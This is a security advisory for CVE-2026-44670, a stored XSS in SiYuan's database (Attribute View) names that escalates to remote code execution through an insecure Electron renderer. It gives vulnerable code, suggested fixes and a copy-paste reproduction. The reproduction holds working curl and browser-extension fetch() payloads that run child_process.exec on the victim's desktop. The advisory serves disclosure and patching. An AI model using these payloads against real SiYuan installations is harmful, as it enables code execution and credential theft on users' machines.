# [C] SiYuan Affected by Stored XSS via Attribute View Name to Electron Renderer RCE

## Summary
Severity: Critical
Advisory: GHSA-2h64-c999-c9r6
CVE: CVE-2026-44670
CWE: CWE-1188, CWE-79, CWE-94
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-2h64-c999-c9r6
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260512140701-d7b77d945e0d

## Details
## Summary

The kernel stores Attribute View (AV / database) names without any HTML escape, then a render template uses raw `strings.ReplaceAll(tpl, "${avName}", nodeAvName)` to embed the name in HTML before pushing to all clients via WebSocket. Three independent client paths (`render.ts:120` → `outerHTML`, `Title.ts:401` → `innerHTML`, `transaction.ts:559` → `innerHTML`) consume the value without escaping. Because the main BrowserWindow runs `nodeIntegration:true, contextIsolation:false, webSecurity:false` (`app/electron/main.js:407-411`), HTML injection in the renderer becomes Node.js code execution.

Payload is stored on disk under `data/storage/av/<id>.json`, replicates via every sync transport (S3 / WebDAV / cloud), survives `.sy.zip` export-import, and triggers for any role (Administrator / Editor / Reader / publish-service Visitor) opening a doc bound to the AV.

## Details

**Kernel write — no escape.** `kernel/model/attribute_view.go:3244-3255`:
```go
attrView.Name = strings.TrimSpace(operation.Data.(string))
attrView.Name = strings.ReplaceAll(attrView.Name, "\n", " ")
if 512 < utf8.RuneCountInString(attrView.Name) {
    attrView.Name = gulu.Str.SubStr(attrView.Name, 512)
}
err = av.SaveAttributeView(attrView)         // ← no html.EscapeString
```

**Kernel template — raw replace.** `kernel/model/attribute_view.go:3242,3283-3284`:
```go
const attrAvNameTpl = `<span data-av-id="${avID}" ... class="popover__block">${avName}</span>`
// ...
tpl := strings.ReplaceAll(attrAvNameTpl, "${avID}", nodeAvID)
tpl = strings.ReplaceAll(tpl, "${avName}", nodeAvName)   // ← raw
```

**Sink #1 — AV body header → outerHTML.** `app/src/protyle/render/av/render.ts:120` (returned from `genTabHeaderHTML`, written via outerHTML at `render.ts:596`):
```ts
<div contenteditable="${editable}" ... data-title="${data.name || ""}" ...>${data.name || ""}</div>
// ...
e.firstElementChild.outerHTML = `<div class="av__container">${genTabHeaderHTML(...)}...</div>`;
```
Same pattern in `kanban/render.ts:227` and `gallery/render.ts:142`.

**Sink #2 — Doc title attribute strip → innerHTML.** `app/src/protyle/header/Title.ts:396-403`:
```ts
response.data.attrViews.forEach((item: { id: string, name: string }) => {
    avTitle += `<span data-av-id="${item.id}" ... class="popover__block">${item.name}</span>&nbsp;`;
});
nodeAttrHTML += `<div class="protyle-attr--av">...${avTitle}</div>`;
this.element.querySelector(".protyle-attr").innerHTML = nodeAttrHTML;
```

**Sink #3 — WebSocket `updateAttrs` push → innerHTML.** `app/src/protyle/wysiwyg/transaction.ts:549-562,659`:
```ts
const escapeHTML = Lute.EscapeHTMLStr(data.new[key]);
if (key === "bookmark") { bookmarkHTML = `...${escapeHTML}...`; }
else if (key === "name")     { nameHTML  = `...${escapeHTML}...`; }
else if (key === "alias")    { aliasHTML = `...${escapeHTML}...`; }
else if (key === "memo")     { memoHTML  = `...${escapeHTML}...`; }
else if (key === "custom-avs" && data.new["av-names"]) {
    avHTML = `<div class="protyle-attr--av">...${data.new["av-names"]}</div>`;
    //                                          ^^^^^^^^^^^^^^^^^^^^^^^^ raw, unlike the four siblings above
}
// ...
attrElement.innerHTML = nodeAttrHTML + Constants.ZWSP;
```
The four sibling cases use `Lute.EscapeHTMLStr` — proving the team knows the right pattern; only `av-names` was missed.

**Renderer posture — RCE multiplier.** `app/electron/main.js:407-411`:
```js
webPreferences: {
    nodeIntegration: true, webviewTag: true,
    webSecurity: false, contextIsolation: false,
}
```

**Reachability.** Route `/api/transactions setAttrViewName` requires `CheckAuth + CheckAdminRole + CheckReadonly`. On default install (`Conf.AccessAuthCode == ""`), `kernel/model/session.go:261-287` auto-grants Administrator to local-origin requests. The Origin check accepts `localhost` / loopback only **but `chrome-extension://` is explicitly allowlisted** (`session.go:277`), so any installed browser extension calls the API as admin. Local clients with no Origin header (CLI tools) also pass.

## Suggested fix

1. `kernel/model/attribute_view.go getAvNames` (line 3283-3284): replace the two `strings.ReplaceAll` calls with `template.HTMLEscapeString(nodeAvName)` for the `${avName}` substitution.
2. `transaction.ts:559`: wrap with `Lute.EscapeHTMLStr` to match siblings at lines 549-557.
3. `render.ts:120`: use `Lute.EscapeHTMLStr(data.name)` for both `data-title=` and the text content.
4. `Title.ts:396`: escape `item.name` via `Lute.EscapeHTMLStr` and `item.id` via `escapeAttr`.
5. *(Defense-in-depth)* Switch the main BrowserWindow to `contextIsolation: true` with a preload bridge — caps every future renderer XSS at "DOM only," not RCE.

---

## Reproduction (copy-paste-ready)

Tested on Linux/macOS with SiYuan v3.6.5 (re-verified against `master` HEAD on 2026-05-03). Windows users: replace `python3` with `py` and use Git Bash / WSL for the shell snippets, or translate to PowerShell.

### Prereqs

1. **Install SiYuan v3.6.5** from https://github.com/siyuan-note/siyuan/releases. Launch it once so the workspace at `~/SiYuanWorkspace` is initialized. Do **not** set an Access Authorization Code (default).
2. **Verify the kernel responds:**
   ```sh
   curl -s http://127.0.0.1:6806/api/system/version
   ```
   Expected output (single line of JSON):
   ```json
   {"code":0,"msg":"","data":"3.6.5"}
   ```
3. **Pin shell variables** for the rest of the PoC:
   ```sh
   API=http://127.0.0.1:6806
   WS=~/SiYuanWorkspace                                      # adjust if your workspace lives elsewhere

   NOTEBOOK_ID=$(curl -s -X POST $API/api/notebook/lsNotebooks \
     -H 'Content-Type: application/json' -d '{}' \
     | python3 -c 'import sys,json; print(json.load(sys.stdin)["data"]["notebooks"][0]["id"])')
   echo "Using notebook: $NOTEBOOK_ID"
   ```
   Expected: a 14-digit-timestamp + `-7chars` ID like `20240101120000-abc1234`. If you get an empty string, you have no notebooks — open SiYuan and click "New notebook" once.

### Step A — Create the AV via the SiYuan UI (one-time, ~10 seconds)

The kernel's `setAttrViewName` requires the AV file to already exist on disk (`av.ParseAttributeView` returns an error otherwise). The simplest way to create one is via the editor:

1. Open SiYuan. In any document, type `/database` and press Enter (or open the slash-command menu and pick **Database**).
2. The editor inserts an Attribute View block. The kernel writes a JSON file to `<workspace>/data/storage/av/<av-id>.json`.
3. Capture the AV ID — the most recently written file in that directory:
   ```sh
   AV_FILE=$(ls -1t "$WS/data/storage/av/"*.json 2>/dev/null | head -1)
   AV_ID=$(basename "$AV_FILE" .json)
   echo "AV_ID: $AV_ID"
   ```
   Expected: same 14-digit-timestamp + `-7chars` shape, e.g. `20260503160000-aaaaaaa`. If empty, the AV file wasn't created — repeat the UI step. (If your workspace already has many AV files, this picks the newest by mtime; alternatively right-click the inserted database block in SiYuan → Inspect Element to read its `data-av-id` attribute.)

4. Capture the doc ID that hosts the AV: right-click the doc tab → **Copy ID**, or read it from the doc's `data-node-id` in DevTools (Ctrl+Shift+I). Set:
   ```sh
   DOC_ID=<root-block-id-of-the-doc-containing-the-AV>
   ```

### Step B — Plant the XSS payload as the AV name

The payload is written directly inside an unquoted heredoc so bash expands `$AV_ID` while preserving the `\"` JSON-escape sequences literally. Single-quote chars (`'`) in the inner JS need no escaping inside a JSON string.

```sh
curl -s -X POST $API/api/transactions \
  -H 'Content-Type: application/json' \
  --data-binary @- <<EOF
{
  "session": "x",
  "app": "siyuan",
  "transactions": [{
    "doOperations": [{
      "action": "setAttrViewName",
      "id": "$AV_ID",
      "data": "<img src=x onerror=\"require('child_process').exec(process.platform==='win32'?'calc.exe':process.platform==='darwin'?'open -a Calculator':'xcalc')\">"
    }],
    "undoOperations": []
  }]
}
EOF
```
Expected response:
```json
{"code":0,"msg":"","data":[{"doOperations":[...,"action":"setAttrViewName",...]}]}
```

### Step C — Verify the unescaped storage

```sh
python3 -c "import json; print(json.load(open('$WS/data/storage/av/$AV_ID.json'))['name'])"
```
Expected output (the raw HTML as stored — `print` does not escape `"`, so they appear as literal quotes):
```
<img src=x onerror="require('child_process').exec(process.platform==='win32'?'calc.exe':process.platform==='darwin'?'open -a Calculator':'xcalc')">
```

### Step D — Trigger

In the SiYuan desktop client:

1. Switch away from the doc that contains the AV (open another doc, or close the tab).
2. Re-open the doc containing the AV (`$DOC_ID`).
3. The AV body header is rendered via `genTabHeaderHTML` → `outerHTML` at `app/src/protyle/render/av/render.ts:596`. The browser parses the `<img>` tag, fails to load `src=x`, and fires `onerror`.
4. **Calculator (or `xcalc` / `open -a Calculator`) launches.**

If nothing happens, open DevTools (Ctrl+Shift+I / ⌘⌥I) → Console; you should see the error from the failed `src=x` load. If the AV is in another doc you haven't opened recently, the cached render may be stale — close all tabs and re-open.

### Step E — Browser-extension attack vector (the realistic remote path)

A malicious or compromised installed browser extension's content/background script runs with `chrome-extension://<id>` Origin, allowlisted by `session.go:277`. The extension can run Steps B's curl-equivalent via `fetch()`:
```js
// Inside any extension content/background script
fetch('http://127.0.0.1:6806/api/transactions', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    session: 'x', app: 'siyuan',
    transactions: [{ doOperations: [{
      action: 'setAttrViewName',
      id: '<av-id-discovered-via-prior-recon-fetches>',
      data: `<img src=x onerror="require('child_process').exec('xcalc')">`
    }] }]
  })
});
```
The extension can also enumerate AV IDs by first calling `/api/notebook/lsNotebooks`, then walking notebook trees.

A page from `https://attacker.com` is rejected — `IsLocalOrigin` only matches localhost/loopback. Realistic remote vectors are: **browser extensions**, **localhost-served webpages**, **shared `.sy.zip` imports**, **sync replication from a co-author's compromised device**.

### Cleanup

```sh
# Remove the test doc (also removes the AV binding in the doc)
curl -s -X POST $API/api/filetree/removeDocByID \
  -H 'Content-Type: application/json' -d "{\"id\":\"$DOC_ID\"}"

# Manually delete the AV file
rm -f $WS/data/storage/av/$AV_ID.json

# Restart SiYuan to clear in-memory state
```

## Impact

- **RCE on the victim's desktop** with the user's privileges, no extra prompt after the trigger condition is met.
- **Persistent** — payload survives restart, syncs across devices, rides in `.sy.zip` exports and Bazaar templates.
- **Triggers for any role** opening a doc bound to the AV (incl. Reader-role publish viewers).
- After RCE: full filesystem read (incl. `~/.ssh/`, `~/.aws/credentials`, workspace `conf/conf.json` — kernel API token + AccessAuthCode hash), persistence (`.bashrc` / Startup folder / LaunchAgent), cloud-account pivot.
- **Attack vectors:** browser extensions (`chrome-extension://` Origin allowlisted); shared `.sy.zip` files; Bazaar templates; sync peers; co-authors on a shared workspace; publish-service planters infecting Reader viewers.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-2h64-c999-c9r6
- https://nvd.nist.gov/vuln/detail/CVE-2026-44670
- https://github.com/siyuan-note/siyuan
